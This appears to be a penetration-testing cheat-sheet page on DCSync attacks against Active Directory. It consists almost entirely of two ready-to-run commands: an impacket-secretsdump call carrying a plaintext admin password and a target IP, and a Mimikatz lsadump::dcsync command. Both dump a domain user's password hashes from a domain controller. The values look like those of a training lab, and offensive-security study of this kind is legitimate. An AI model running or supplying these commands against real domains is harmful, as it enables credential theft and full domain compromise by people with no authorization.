# Domain Controller Synchronization



{% code overflow="wrap" %}
```sh
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
{% endcode %}



{% code title="Mimikatz" %}
```
lsadump::dcsync /user:corp\dave
```
{% endcode %}



